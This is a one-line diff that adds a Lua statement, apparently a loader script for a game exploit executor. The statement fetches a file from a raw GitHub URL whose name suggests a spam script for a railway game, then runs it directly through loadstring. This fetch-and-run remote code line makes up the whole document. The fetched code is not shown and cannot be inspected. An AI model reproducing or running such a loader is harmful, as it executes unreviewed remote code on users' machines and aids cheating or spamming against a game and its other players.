@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/british-railway-spam7-wuu55kg4o4yd0z.lua"))()
